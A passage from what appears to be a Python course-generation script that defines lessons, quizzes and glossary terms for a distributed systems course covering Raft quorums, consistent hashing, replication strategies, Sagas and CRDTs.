                "<pre><code># The Raft Quorum Mathematics:\n# Cluster Size (N) | Quorum Majority (N/2 + 1) | Max Tolerated Node Failures (F)\n# --------------------------------------------------------------------------------\n# 3 nodes          | 2 nodes                    | 1 node failure survived\n# 5 nodes          | 3 nodes                    | 2 node failures survived (Industry Standard!)\n# 7 nodes          | 4 nodes                    | 3 node failures survived</code></pre>",
                "<div class=\"callout\"><p><strong>The Odd Number Rule:</strong> Always deploy consensus clusters (etcd, ZooKeeper, Consul) in odd numbers (3, 5, or 7 nodes). An even number (e.g. 4 nodes) requires 3 for quorum, offering the exact same fault tolerance as 3 nodes with higher cost and split risk.</p></div>"
            ],
            "The Raft State Machine Lifecycle", "Follower -> Candidate -> Leader",
            [
                {"title": "1. Follower (Normal State)", "lines": ["Listens for heartbeats from Leader", "If heartbeat times out -> Becomes Candidate!"]},
                {"title": "2. Candidate (Election)", "lines": ["Requests votes from all nodes", "Wins majority (3/5)? Becomes Leader!"]},
                {"title": "3. Leader (Authority)", "lines": ["Accepts all client writes", "Replicates log entries across cluster quorum"]}
            ],
            "Preventing Split-Brain via Quorum", "Why overlapping majorities guarantee truth",
            [
                {"title": "Partition Split (5 nodes)", "lines": ["Sub-cluster A: 3 nodes (Has Quorum! Elects leader, operates normally)", "Sub-cluster B: 2 nodes (No Quorum! Rejects all writes, zero split-brain!)"]}
            ],
            "Complete the consensus sentence",
            "The Raft consensus algorithm guarantees safe log replication across clusters by requiring agreement from a {1} majority ($N/2 + 1$) to prevent fatal {2} states.",
            [
                {"answer": "quorum", "hint": "Majority threshold of nodes", "options": ["quorum", "formatting", "licensing"]},
                {"answer": "split-brain", "hint": "Two competing leaders accepting conflicting writes", "options": ["split-brain", "hardware", "monitors"]}
            ],
            [
                {"q": "What is the 'Split-Brain' problem in distributed database clusters?",
                 "a": ["A network partition divides a cluster, causing two different nodes to believe they are the legitimate leader and accept conflicting writes simultaneously", "A computer with two processors", "A human developer being confused", "A memory leak in Python"],
                 "c": 0, "why": "Split-brain occurs when isolated sub-clusters elect competing leaders, corrupting data integrity."},
                {"q": "How many node failures can a 5-node Raft consensus cluster tolerate while continuing to operate normally?",
                 "a": ["2 node failures (a quorum of 3 nodes remains active to make decisions)", "1 node failure", "4 node failures", "Zero node failures"],
                 "c": 0, "why": "A 5-node cluster needs 3 nodes for quorum ($5/2 + 1 = 3$), tolerating $5 - 3 = 2$ simultaneous failures."},
                {"q": "Why are production consensus clusters (like etcd in Kubernetes) deployed with an odd number of nodes (3, 5, 7)?",
                 "a": ["An odd number prevents 50/50 vote ties during elections and provides optimal fault tolerance without wasted redundant nodes", "Odd numbers are lucky in computer science", "Even numbers crash Linux", "It is required by Python syntax"],
                 "c": 0, "why": "Odd node counts avoid split-vote deadlocks and maximize fault tolerance per node count."},
                {"q": "What critical distributed systems platform relies on the Raft algorithm to store cluster state in Kubernetes?",
                 "a": ["etcd", "MySQL", "Redis", "SQLite"],
                 "c": 0, "why": "etcd uses Raft to provide consistent, highly available key-value storage for all Kubernetes cluster state."}
            ],
            "You understand distributed consensus, Replicated State Machines, quorum mechanics, and the Raft protocol.",
            "Data Partitioning and Consistent Hashing", "Distribute data evenly across horizontal database nodes with minimal reshuffling."
        ),
        build_lesson(
            4, "data-partitioning-consistent-hashing", "Data Partitioning and Consistent Hashing", "Consistent Hashing",
            "Horizontal scaling: Range Partitioning vs Hash Partitioning, the mod-N reshuffling disaster, and the Consistent Hashing Ring.",
            "Why does naive modulo hashing (`hash(key) % N`) fail catastrophically when scaling distributed caching clusters?",
            ["Adding or removing a single node changes N, causing nearly 100% of all keys to re-hash to new nodes, triggering a massive cache wipeout and database collapse", "Modulo math is illegal in Python", "Modulo hashing deletes the keys", "Modulo only works with odd numbers"],
            0, "Changing N in modulo hashing forces almost all keys to move, invalidating caches and overwhelming databases.",
            [
                "<p>When a dataset exceeds the storage capacity of a single server (e.g. 50 Terabytes of user profiles), you must <strong>partition (shard)</strong> the data across multiple machines. But how do you decide which server holds User #849,201?</p>",
                "<p>The Disaster of Naive Modulo Hashing (`node = hash(key) % N`):</p>",
                "<ul><li>Suppose you have 4 cache servers ($N=4$). Everything works.</li><li>You add a 5th server ($N=5$) to handle traffic.</li><li>Because the divisor changed from 4 to 5, <strong>nearly 100% of all existing keys now hash to the wrong server!</strong></li><li>Result: A <strong>100% Cache Stampede</strong>! All cache lookups miss simultaneously, flooding downstream databases and crashing your entire enterprise!</li></ul>",
                "<p>The Solution: <strong>Consistent Hashing (Karger et al., MIT)</strong>:</p>",
                "<ul><li><strong>1. The Hash Ring ($0$ to $2^{32}-1$):</strong> Map the output range of a hash function (SHA-256) onto an abstract circular ring.</li><li><strong>2. Nodes Placed on Ring:</strong> Hash server identifiers (`hash(\"server_1\")`) and place them at positions on the ring.</li><li><strong>3. Keys Mapped Clockwise:</strong> Hash a key (`hash(\"user_102\")`), place it on the ring, and walk clockwise until you hit the first server node!</li><li><strong>4. Minimal Reshuffling ($K/N$):</strong> When adding a node, <strong>only keys belonging to that node's immediate neighbor are moved!</strong> All other nodes keep their keys intact!</li><li><strong>5. Virtual Nodes (Vnodes):</strong> Assign each physical server 100+ virtual points on the ring to guarantee balanced, uniform data distribution.</li></ul>",
                "<pre><code># The Consistent Hashing Ring in Action:\n# Ring Range: 0 ----------- 1,000,000,000 (Wraps around to 0)\n# Node A: at 250,000 | Node B: at 500,000 | Node C: at 750,000 | Node D: at 1,000,000\n# Key \"user_42\" hashes to 320,000 -> Walks clockwise to Node B (at 500,000)!\n#\n# If Node E is added at 400,000:\n# ONLY keys between 250,000 and 400,000 move to Node E.\n# Nodes A, C, and D remain 100% untouched! Zero cache stampede!</code></pre>",
                "<div class=\"callout\"><p><strong>The Distributed Superpower:</strong> Consistent Hashing is the foundational architectural pillar of Amazon DynamoDB, Apache Cassandra, Akamai CDN, and Discord's stateful voice servers.</p></div>"
            ],
            "Modulo Hashing vs Consistent Hashing", "Massive cache stampede vs surgical key migration",
            [
                {"title": "Naive Modulo (hash % N)", "lines": ["Adding 1 server changes N", "Nearly 100% of keys move to wrong nodes!", "Massive cache wipeout & database collapse"]},
                {"title": "Consistent Hashing Ring", "lines": ["Keys and nodes mapped onto circular ring", "Adding 1 node moves only K/N keys", "99% of cache hits preserved safely!"]}
            ],
            "Virtual Nodes (Vnodes) Balance", "Preventing hot spots on the ring",
            [
                {"title": "Single Point per Server", "lines": ["Uneven spacing causes hot spots & load skew"]},
                {"title": "150 Vnodes per Server", "lines": ["Interleaved evenly across ring", "Uniform, perfectly balanced load distribution!"]}
            ],
            "Complete the consistent hashing sentence",
            "Consistent hashing maps nodes and keys onto a circular ring, ensuring that adding or removing a server relocates only a tiny fraction of {1} without causing a cache {2}.",
            [
                {"answer": "keys", "hint": "Data records or cache items", "options": ["keys", "monitors", "cables"]},
                {"answer": "stampede", "hint": "Mass simultaneous cache miss and database overload", "options": ["stampede", "formatting", "licensing"]}
            ],
            [
                {"q": "What proportion of keys must be moved when a new node is added to a consistent hashing ring with N nodes?",
                 "a": ["Approximately 1/N of the total keys (only keys belonging to the immediate neighbor segment)", "100% of all keys", "Zero keys", "Half of all keys"],
                 "c": 0, "why": "Consistent hashing bounds re-mapping to $K/N$ keys, moving only data adjacent to the new node."},
                {"q": "What problem do 'Virtual Nodes' (Vnodes) solve in consistent hashing implementations?",
                 "a": ["They solve non-uniform data distribution and 'hot spots' by mapping each physical machine to multiple distributed positions across the ring", "They make servers virtual machines", "They eliminate the need for memory", "They encrypt the keys"],
                 "c": 0, "why": "Virtual nodes distribute load uniformly by interleaving physical server points throughout the ring."},
                {"q": "What major distributed databases rely on consistent hashing for data partitioning?",
                 "a": ["Amazon DynamoDB and Apache Cassandra", "SQLite and Microsoft Access", "Redis in standalone mode only", "Flat CSV files"],
                 "c": 0, "why": "DynamoDB and Cassandra use consistent hashing rings to partition data across horizontal clusters."},
                {"q": "What is a 'Cache Stampede' that consistent hashing prevents during node scaling?",
                 "a": ["When massive cache invalidation forces thousands of concurrent requests to hit the underlying database simultaneously, causing an outage", "When animals run through a data center", "A computer virus", "A sound effect in a game"],
                 "c": 0, "why": "Cache stampedes overwhelm backend databases when distributed caches are abruptly invalidated."}
            ],
            "You know how to design scalable horizontal data partitioning using consistent hashing rings and virtual nodes.",
            "Replication Strategies: Single-Leader, Multi-Leader, and Leaderless", "Manage data replication across nodes, handle lag, and resolve conflicts."
        ),
        build_lesson(
            5, "replication-single-multi-leaderless", "Replication Strategies: Single-Leader, Multi-Leader, and Leaderless", "Replication",
            "Replication topologies: Single-Leader (read replicas), Multi-Leader (cross-region writes), and Leaderless (Dynamo-style quorum $W + R > N$).",
            "What is the mathematical condition for a 'Quorum Read/Write' in a Leaderless distributed database (Dynamo-style)?",
            ["W + R > N (where N is total replicas, W is write quorum, and R is read quorum), guaranteeing that read and write sets overlap", "W + R = 0", "W = R = N", "W + R < N"],
            0, "When W + R > N, the read quorum is mathematically guaranteed to include at least one node with the latest write.",
            [
                "<p>Why replicate data across multiple servers? Two reasons: <strong>Fault Tolerance</strong> (if a disk dies, another node has the data) and <strong>Read Throughput</strong> (serve 10,000 queries/sec across 10 replicas). But keeping copies of data synchronized across network links is one of computer science's greatest challenges.</p>",
                "<p>The Three Fundamental Replication Topologies:</p>",
                "<ul><li><strong>1. Single-Leader Replication (Primary-Replica — PostgreSQL, MySQL):</strong> All writes go to one <em>Leader</em> node. The Leader streams changes to read-only <em>Replicas</em>. Simple, prevents write conflicts! <em>Limitation:</em> The Leader is a single bottleneck for writes; cross-continental writes suffer high latency.</li><li><strong>2. Multi-Leader Replication (Active-Active — Cross-Region):</strong> Multiple leader nodes accept writes simultaneously (e.g. Leader 1 in US, Leader 2 in Europe). Fast local writes! <em>Challenge:</em> <strong>Write Conflicts</strong>: What if User A edits their email on Leader 1 and Leader 2 at the same second? Requires conflict resolution (Last-Write-Wins, CRDTs).</li><li><strong>3. Leaderless Replication (Dynamo-Style — Cassandra, Amazon Dynamo):</strong> Any node can accept writes and reads. Clients send writes to $W$ nodes and reads from $R$ nodes concurrently! <strong>Quorum Guarantee:</strong> If $W + R > N$, at least one node in your read set is guaranteed to hold the latest write!</li></ul>",
                "<pre><code># The Leaderless Quorum Equation in Action:\n# Total Replicas: N = 3\n# Write Quorum:   W = 2 (Write must succeed on at least 2 nodes)\n# Read Quorum:    R = 2 (Read must query at least 2 nodes)\n#\n# Calculation: W + R = 2 + 2 = 4\n# Since 4 > 3 (W + R > N holds!), the Pigeonhole Principle guarantees\n# that your Read set shares at least 1 overlapping node with your Write set!\n# Result: You are mathematically guaranteed to read the latest write!</code></pre>",
                "<div class=\"callout\"><p><strong>The Replication Lag Reality:</strong> In asynchronous single-leader systems, read replicas can lag behind the leader by seconds. A user who updates their profile and immediately refreshes might read their old stale data unless 'Read-Your-Own-Writes' consistency is enforced.</p></div>"
            ],
            "The Three Replication Models", "Single-Leader vs Multi-Leader vs Leaderless",
            [
                {"title": "Single-Leader (Postgres)", "lines": ["All writes hit one Primary node", "Replicas serve read-only queries", "Simple, zero write conflicts, write bottleneck"]},
                {"title": "Multi-Leader (Active-Active)", "lines": ["Multiple leaders accept writes (US & EU)", "Fast local write latency globally", "Complex write conflict resolution required!"]},
                {"title": "Leaderless (Dynamo / Cassandra)", "lines": ["Zero leaders; clients write to W nodes", "Read from R nodes concurrently", "Guaranteed consistent when W + R > N"]}
            ],
            "Read-After-Write Consistency", "Preventing stale user profile refreshes",
            [
                {"title": "User Updates Name to 'Alice'", "lines": ["Writes to Primary database"]},
                {"title": "User Immediately Refreshes", "lines": ["Route read to Primary for 5s (Read-Your-Own-Writes)", "Prevents reading stale 'Bob' from lagging replica!"]}
            ],
            "Complete the replication sentence",
            "In leaderless replication architectures, configuring read and write quorums so that $W + R > N$ guarantees that read operations will always overlap with the latest {1} {2}.",
            [
                {"answer": "write", "hint": "Data mutation operation", "options": ["write", "formatting", "licensing"]},
                {"answer": "quorum", "hint": "Overlapping subset of replica nodes", "options": ["quorum", "hardware", "monitors"]}
            ],
            [
                {"q": "What is 'Replication Lag' in single-leader database architectures?",
                 "a": ["The delay between a write being committed on the primary leader and that change being propagated and applied to read replicas", "The speed of the computer fan", "A delay in typing code", "The time to download a database"],
                 "c": 0, "why": "Asynchronous replication causes replicas to lag slightly behind the leader during high write volume."},
                {"q": "What is 'Read-Your-Own-Writes' consistency?",
                 "a": ["A guarantee that if a user updates a record, their subsequent reads will immediately reflect that update, even if other users see slight replication lag", "Writing down what you read", "A database query optimizer", "Reading books out loud"],
                 "c": 0, "why": "Read-your-own-writes ensures users see their own modifications immediately without confusion from replica lag."},
                {"q": "How does a multi-leader system resolve conflicting concurrent writes to the same record using 'Last-Write-Wins' (LWW)?",
                 "a": ["It compares the timestamps attached to each write and keeps the write with the highest timestamp, discarding the older write", "It keeps both writes merged together", "It deletes the record", "It asks the user to choose"],
                 "c": 0, "why": "Last-Write-Wins uses wall-clock timestamps to order and resolve concurrent conflicting mutations."},
                {"q": "Why can Last-Write-Wins (LWW) cause silent data loss in distributed systems?",
                 "a": ["Clock skew between server physical clocks can cause a truly newer write to have a lower timestamp, incorrectly overwriting real data", "LWW is illegal in databases", "LWW deletes random files", "LWW runs in memory only"],
                 "c": 0, "why": "Clock drift between servers can distort timestamp order, causing newer updates to be discarded."},
            ],
            "You know how to architect Single-Leader, Multi-Leader, and Leaderless quorum replication systems.",
            "Distributed Transactions: Two-Phase Commit (2PC) and the Saga Pattern", "Coordinate transactions across independent microservices safely."
        ),
        build_lesson(
            6, "distributed-transactions-2pc-saga-pattern", "Distributed Transactions: Two-Phase Commit (2PC) and the Saga Pattern", "Distributed Transactions",
            "Transaction boundaries: the death of ACID across microservices, Two-Phase Commit (2PC) blocking hazards, and the event-driven Saga pattern.",
            "Why is the traditional Two-Phase Commit (2PC) protocol avoided in modern high-throughput microservice architectures?",
            ["2PC is a blocking protocol: if the transaction coordinator or a node fails during Phase 2, all participating databases hold row locks indefinitely, stalling the system", "2PC is only supported in C++", "2PC runs without electricity", "2PC deletes database tables"],
            0, "Two-Phase Commit holds blocking database locks across network hops, making it brittle and vulnerable to coordinator failure.",
            [
                "<p>In a monolithic application with a single PostgreSQL database, multi-table transactions are easy: <code>BEGIN; ... COMMIT;</code>. The database guarantees ACID (Atomicity, Consistency, Isolation, Durability). But in a microservice architecture—where the <strong>Order Service</strong>, <strong>Payment Service</strong>, and <strong>Inventory Service</strong> each have their own independent databases—<strong>ACID transactions across microservices are impossible</strong>.</p>",
                "<p>Why 2PC Fails and Sagas Win:</p>",
                "<ul><li><strong>1. The Two-Phase Commit (2PC) Trap:</strong> Phase 1 (Prepare: Can everyone commit?) $\\rightarrow$ Phase 2 (Commit: Everyone commit!). <em>The Flaw:</em> Nodes hold database row locks across network hops. If the coordinator crashes mid-transaction, <strong>database tables freeze indefinitely!</strong> Unusable at scale.</li><li><strong>2. The Saga Pattern (Event-Driven & Non-Blocking):</strong> Decomposes a distributed transaction into a sequence of local transactions:<ul><li>Step 1: Order Service creates order (PENDING). Emits event: `OrderCreated`.</li><li>Step 2: Payment Service charges credit card. Emits event: `PaymentSucceeded`.</li><li>Step 3: Inventory Service reserves stock. Emits event: `InventoryReserved`.</li></ul></li><li><strong>3. Compensating Transactions (Undoing Failures):</strong> What if Step 3 fails (Out of Stock)? The Saga triggers compensating undo actions backward: Step 2b: Refund Payment $\\rightarrow$ Step 1b: Cancel Order! <strong>Eventually consistent with zero blocking locks!</strong></li></ul>",
                "<pre><code># The Saga Pattern: Forward Success vs Compensating Rollback:\n# SUCCESS FLOW:\n# [Create Order] ──> [Charge Payment] ──> [Reserve Inventory] ──> [Order COMPLETE!]\n#\n# FAILURE & COMPENSATING ROLLBACK FLOW:\n# [Create Order] ──> [Charge Payment] ──> [Reserve Inventory FAILS!]\n#                                                    │\n#                         ┌──────────────────────────┘\n#                         ▼ (Compensating Rollback Chain)\n#                  [Refund Payment] ──> [Mark Order CANCELLED]</code></pre>",
                "<div class=\"callout\"><p><strong>The Distributed Atomicity Truth:</strong> You cannot lock the world across microservices. Accept eventual consistency and build compensating rollback workflows for every business step.</p></div>"
            ],
            "Two-Phase Commit vs The Saga Pattern", "Synchronous blocking locks vs asynchronous compensating workflows",
            [
                {"title": "Two-Phase Commit (2PC - Blocking)", "lines": ["Holds database row locks across network", "Coordinator crash freezes entire system", "Fails catastrophically at cloud scale"]},
                {"title": "The Saga Pattern (Non-Blocking)", "lines": ["Sequence of independent local transactions", "Coordinated via asynchronous message events", "Handles failures via Compensating Transactions"]}
            ],
            "Choreography vs Orchestration Sagas", "Event-driven vs centralized coordinator",
            [
                {"title": "Choreography (Decentralized)", "lines": ["Services publish & listen to events (Kafka)", "Simple, decoupled, but hard to trace at scale"]},
                {"title": "Orchestration (Centralized)", "lines": ["Dedicated orchestrator (Temporal / AWS Step Functions)", "State machine explicitly coordinates steps & rollbacks"]}
            ],
            "Complete the distributed transactions sentence",
            "The Saga pattern coordinates distributed transactions without blocking locks by executing a sequence of local transactions and triggering {1} transactions to undo actions if a step {2}.",
            [
                {"answer": "compensating", "hint": "Corrective rollback transactions (e.g. refunds)", "options": ["compensating", "formatting", "licensing"]},
                {"answer": "fails", "hint": "Errors or business rejections", "options": ["fails", "hardware", "monitors"]}
            ],
            [
                {"q": "What is a 'Compensating Transaction' in the Saga pattern?",
                 "a": ["An explicit undo operation (like issuing a refund or releasing reserved stock) executed to revert the business effects of a previously committed step when a later step fails", "A salary bonus for developers", "An automatic tax calculation", "A database backup restore"],
                 "c": 0, "why": "Compensating transactions reverse the business impact of earlier steps when subsequent steps fail."},
                {"q": "Why can traditional ACID transactions NOT span across separate microservice databases?",
                 "a": ["Independent databases have isolated transaction logs and cannot coordinate atomic row locks without fragile distributed locking protocols", "Databases refuse to connect to networks", "Microservices do not use databases", "It is forbidden by SQL syntax"],
                 "c": 0, "why": "Independent databases lack shared memory and atomic commit logs, making distributed ACID impractical."},
                {"q": "What is the difference between Choreography and Orchestration in the Saga pattern?",
                 "a": ["Choreography relies on services reacting to events independently; Orchestration uses a centralized coordinator state machine to direct each step", "Choreography is for frontends; orchestration is for backends", "Orchestration runs in C; choreography in Python", "They are identical patterns"],
                 "c": 0, "why": "Choreography is event-driven and decentralized; Orchestration uses a central coordinator (e.g. Temporal)."},
                {"q": "What workflow engine is widely adopted for orchestrating complex Sagas in distributed systems?",
                 "a": ["Temporal (or AWS Step Functions)", "Photoshop", "Git", "React"],
                 "c": 0, "why": "Temporal is the leading open-source durable workflow execution engine for orchestrating distributed sagas."}
            ],
            "You know how to design distributed transactions using the Saga pattern and compensating workflows.",
            "Eventual Consistency, Vector Clocks, and CRDTs", "Resolve distributed state conflicts without centralized coordinators."
        ),
        build_lesson(
            7, "eventual-consistency-vector-clocks-crdts", "Eventual Consistency, Vector Clocks, and CRDTs", "Eventual Consistency",
            "Embracing concurrency: Eventual Consistency, logical time vs physical clocks, Vector Clocks, and Conflict-Free Replicated Data Types (CRDTs).",
            "What is a 'Conflict-Free Replicated Data Type' (CRDT) in collaborative distributed systems?",
            ["A mathematical data structure that can be replicated and modified concurrently across multiple nodes and merged deterministically without conflict", "A database that has no data", "A tool for resolving employee disputes", "An encrypted computer file"],
            0, "CRDTs provide mathematically provable, conflict-free merging of concurrent edits across distributed nodes.",
            [
                "<p>Physical computer clocks drift: using system time (`datetime.now()`) to order events across distributed nodes is guaranteed to corrupt data due to <strong>clock skew</strong>. To reason about causality, distributed systems use <strong>Logical Clocks and CRDTs</strong>.</p>",
                "<p>The Mechanics of Distributed Causality:</p>",
                "<ul><li><strong>1. Eventual Consistency:</strong> If no new updates are made, all replicas will eventually converge to identical values. Replicas accept temporary divergence to provide blazing local write speeds.</li><li><strong>2. Lamport & Vector Clocks:</strong> Instead of physical seconds, time is measured in <strong>logical ticks</strong>. A <strong>Vector Clock</strong> is an array of counters tracking the causal history across all nodes ($[V_A, V_B, V_C]$). It mathematically proves whether Event 1 <em>happened before</em> Event 2, or if they occurred <em>concurrently</em>!</li><li><strong>3. CRDTs (Conflict-Free Replicated Data Types):</strong> Mathematical data structures where the merge operation is <strong>Commutative, Associative, and Idempotent</strong>: $A \\cup B = B \\cup A$. Edits can arrive in any order, be duplicated, and yet <strong>every node converges to the exact same state automatically!</strong></li><li><strong>4. Real-World CRDTs:</strong> Powers Google Docs collaborative editing, Figma multiplayer canvas, and Apple Notes synchronization!</li></ul>",
                "<pre><code># The G-Counter (Grow-Only Counter) CRDT in Python:\nclass GCounter:\n    def __init__(self, node_id, num_nodes=3):\n        self.node_id = node_id\n        self.counts = [0] * num_nodes\n\n    def increment(self):\n        self.counts[self.node_id] += 1\n\n    def value(self):\n        return sum(self.counts)\n\n    def merge(self, other_counter):\n        # Mathematical union: take pairwise maximum of all counters!\n        # Commutative, Associative, & Idempotent! Zero merge conflicts!\n        self.counts = [max(a, b) for a, b in zip(self.counts, other_counter.counts)]</code></pre>",
                "<div class=\"callout\"><p><strong>The Multiplayer Miracle:</strong> CRDTs eliminate the need for centralized lock coordinators. Every client edits locally in offline mode, and merges cleanly when reconnected.</p></div>"
            ],
            "Physical Clocks vs Vector Clocks", "Wall-clock drift vs mathematical causality",
            [
                {"title": "Physical Clock (Clock Skew Hazard)", "lines": ["Server A clock is 50ms ahead of Server B", "Last-Write-Wins overwrites newer data!"]},
                {"title": "Vector Clocks (Causality Array)", "lines": ["[1, 0, 0] -> [1, 1, 0] -> [1, 2, 0]", "Proves mathematical 'happens-before' causality"]}
            ],
            "CRDT Mathematical Invariants", "Why CRDTs converge without conflicts",
            [
                {"title": "Commutative (Order Independent)", "lines": ["merge(A, B) == merge(B, A)"]},
                {"title": "Associative (Grouping Independent)", "lines": ["merge(A, merge(B, C)) == merge(merge(A, B), C)"]},
                {"title": "Idempotent (Duplicate Safe)", "lines": ["merge(A, A) == A (Safe against network retries!)"]}
            ],
            "Complete the eventual consistency sentence",
            "Conflict-Free Replicated Data Types (CRDTs) enable seamless multi-user collaboration by using {1} merge operations that guarantee deterministic state {2} without locks.",
            [
                {"answer": "commutative", "hint": "Order-independent mathematical property", "options": ["commutative", "formatting", "licensing"]},
                {"answer": "convergence", "hint": "Replicas reaching identical values", "options": ["convergence", "hardware", "monitors"]}
            ],
            [
                {"q": "What is 'Clock Skew' and why does it make physical timestamps unreliable for ordering distributed events?",
                 "a": ["Physical quartz crystal clocks in servers drift by milliseconds due to heat and manufacturing variations, making timestamps between machines inconsistent", "Clocks run backwards at night", "Digital clocks cannot display milliseconds", "NTP protocols are illegal"],
                 "c": 0, "why": "Physical clock drift makes comparing wall-clock timestamps across independent servers dangerous."},
                {"q": "What mathematical properties must a CRDT merge function satisfy to guarantee convergence?",
                 "a": ["Commutative (order doesn't matter), Associative (grouping doesn't matter), and Idempotent (duplicates don't change state)", "Addition, Subtraction, and Multiplication", "Linear, Quadratic, and Exponential", "Public, Private, and Protected"],
                 "c": 0, "why": "These algebraic properties ensure that data merges identically regardless of network arrival order or duplicate deliveries."},
                {"q": "What real-world collaborative applications rely heavily on CRDTs for real-time multiplayer editing?",
                 "a": ["Figma (collaborative design), Apple Notes, and collaborative rich-text editors", "Static PDF readers", "Single-player offline games", "Command-line calculators"],
                 "c": 0, "why": "CRDTs power modern multiplayer editing where multiple users edit local state concurrently."},
                {"q": "What does a Vector Clock prove about two distributed events?",
                 "a": ["Whether Event A causally happened before Event B, or whether they occurred concurrently without causal knowledge of each other", "The exact second the event happened", "How fast the network cable was", "The identity of the user"],
                 "c": 0, "why": "Vector clocks determine causal relationships (happened-before vs concurrent) without relying on physical clocks."}
            ],
            "You know how to reason about distributed causality using Vector Clocks and implement conflict-free merging with CRDTs.",
            "Engineering Resilient Distributed Systems", "Synthesize everything: build a scalable, fault-tolerant distributed system."
        ),
        build_lesson(
            8, "engineering-resilient-distributed-systems", "Engineering Resilient Distributed Systems", "Distributed Systems Synthesis",
            "Synthesizing distributed systems: unifying CAP trade-offs, Raft consensus, consistent hashing, quorums, and the Saga pattern.",
            "What architectural mindset defines master distributed systems engineers?",
            ["Designing systems that accept failure and network partitions as inevitable, building self-healing consensus, partitioning, and compensating workflows", "Hoping servers never crash", "Buying the most expensive hardware available", "Writing all software on a single computer"],
            0, "Master engineers assume failure is constant, building self-healing architectures with consensus, consistent hashing, and sagas.",
            [
                "<p>We have covered the foundational reality of distributed systems: network fallacies, partial failure, the CAP and PACELC theorems, Raft consensus, consistent hashing, quorum replication, the Saga pattern, and CRDTs.</p>",
                "<p>Now, we synthesize these into a <strong>Unified Resilient Distributed Architecture</strong>:</p>",
                "<ul><li><strong>1. Coordination Layer (CP — Raft / etcd):</strong> Cluster leader election, service discovery, and configuration state are managed by a 5-node Raft consensus cluster. Linearizable and split-brain immune!</li><li><strong>2. Data Partitioning Layer (Consistent Hashing):</strong> Distributed caching and document partitions use a consistent hashing ring with virtual nodes. Minimal reshuffling ($1/N$) during node scaling!</li><li><strong>3. Distributed Storage Layer (Leaderless Quorum):</strong> Storage nodes use Dynamo-style quorum ($W=2, R=2, N=3$) with $W + R > N$ guarantees, surviving individual node failures.</li><li><strong>4. Cross-Service Business Workflows (The Saga Pattern):</strong> Multi-microservice transactions use asynchronous event-driven sagas with automated compensating rollbacks, eliminating blocking 2PC locks.</li></ul>",
                "<pre><code># The Master Distributed Systems Blueprint:\n# ├── Coordination Tier (etcd / Raft):    Guarantees CP leader election (Odd 5-node cluster)\n# ├── Routing Tier (Consistent Hashing):  Partitions traffic across N horizontal nodes\n# ├── Storage Tier (Quorum W+R > N):     Leaderless replication, survives 1 node death\n# └── Workflow Tier (Saga Pattern):       Non-blocking eventual consistency across services</code></pre>",
                "<div class=\"callout\"><p><strong>The Final Engineering Truth:</strong> You cannot prevent networks from failing. But by designing with consensus, consistent hashing, quorums, and compensating workflows, you build distributed systems that operate flawlessly in an imperfect physical world.</p></div>"
            ],
            "The Master Distributed Systems Stack", "Layered resilience across consensus, partitioning, and workflows",
            [
                {"title": "1. Coordination (Raft / etcd)", "lines": ["5-node odd cluster for leader election", "CP linearizable state, split-brain immune"]},
                {"title": "2. Partitioning (Consistent Hash)", "lines": ["Virtual nodes balance traffic across ring", "Minimal 1/N reshuffling during scaling"]},
                {"title": "3. Storage (Quorum W+R > N)", "lines": ["Dynamo-style replication across 3 nodes", "Survives independent server crashes"]},
                {"title": "4. Workflows (Saga Pattern)", "lines": ["Event-driven non-blocking transactions", "Compensating rollbacks on failure"]}
            ],
            "Embracing Partial Failure", "From fragile single nodes to planetary scale",
            [
                {"title": "Single-Node Architecture", "lines": ["One server fails -> Total system blackout"]},
                {"title": "Resilient Distributed Architecture", "lines": ["Servers die, networks partition, traffic surges", "System self-heals with zero downtime!"]}
            ],
            "Complete the distributed synthesis sentence",
            "Resilient distributed systems achieve planetary scalability by combining Raft consensus for coordination, consistent {1} for partitioning, and {2} workflows for distributed transactions.",
            [
                {"answer": "hashing", "hint": "Ring-based key distribution algorithm", "options": ["hashing", "formatting", "licensing"]},
                {"answer": "Saga", "hint": "Compensating transaction pattern", "options": ["Saga", "Hardware", "Terminal"]}
            ],
            [
                {"q": "What is the primary role of etcd in a distributed Kubernetes cluster?",
                 "a": ["Providing a strongly consistent (CP) distributed key-value store using Raft consensus to manage cluster state and leader election", "Storing video files", "Running user Python scripts", "Serving web pages directly to users"],
                 "c": 0, "why": "etcd uses Raft to provide infallible, linearizable consensus for all Kubernetes cluster state."},
                {"q": "How does combining consistent hashing with quorum replication build a highly scalable storage engine like Amazon Dynamo?",
                 "a": ["Consistent hashing routes keys to specific nodes on the ring, while quorum replication ensures that data is copied to W overlapping replicas for durability", "It makes storage free", "It eliminates the need for hard drives", "It translates code to C"],
                 "c": 0, "why": "Consistent hashing partitions keys horizontally; quorum replication guarantees fault tolerance."},
                {"q": "Why is the Saga pattern preferred over Two-Phase Commit for long-running workflows spanning multiple microservices?",
                 "a": ["Sagas do not hold blocking database locks across network hops, preventing system freezes and allowing services to scale independently", "Sagas are written in Python", "Sagas eliminate database backups", "Sagas run without memory"],
                 "c": 0, "why": "Sagas decouple transactions into local steps with compensating rollbacks, avoiding blocking locks."},
                {"q": "What is the ultimate mark of an expert Distributed Systems Architect?",
                 "a": ["Designing systems that embrace network unreliability, partial failure, and concurrency by construction, delivering dependable service at massive scale", "Assuming the network is 100% reliable", "Building everything on a single giant computer", "Refusing to measure latency"],
                 "c": 0, "why": "Architecting systems that thrive amidst partial failure and network partitions defines elite mastery."}
            ],
            "You have completed the Distributed Systems & Scalability course.",
            "Next Course: System Design: From Idea to Production", "Synthesize everything you have learned across the 100 courses into the ultimate milestone: designing planetary-scale systems from scratch."
        )
    ]

    glossary = [
        {"id": "fallacies-cap", "title": "Fallacies & CAP", "terms": [
            {"term": "Partial Failure", "def": "A condition in distributed computing where components fail independently while the system continues in an uncertain state.", "lesson": 1, "tags": ["distributed", "failures"]},
            {"term": "CAP Theorem", "def": "The mathematical proof that distributed stores must choose between Consistency and Availability during network Partitions.", "lesson": 2, "tags": ["theory", "cap"]},
            {"term": "PACELC Theorem", "def": "An extension of CAP modeling the trade-off between Latency and Consistency during normal non-partitioned operation.", "lesson": 2, "tags": ["theory", "pacelc"]}
        ]},
        {"id": "consensus-partition", "title": "Consensus & Hashing", "terms": [
            {"term": "Raft Consensus", "def": "A distributed consensus algorithm decomposing agreement into Leader Election, Log Replication, and Safety.", "lesson": 3, "tags": ["consensus", "raft"]},
            {"term": "Split-Brain", "def": "A failure state where two competing nodes both declare themselves leader, accepting conflicting mutations.", "lesson": 3, "tags": ["failures", "splitbrain"]},
            {"term": "Consistent Hashing", "def": "Mapping nodes and keys onto a circular ring to ensure adding/removing nodes relocates only K/N keys.", "lesson": 4, "tags": ["scaling", "hashing"]}
        ]},
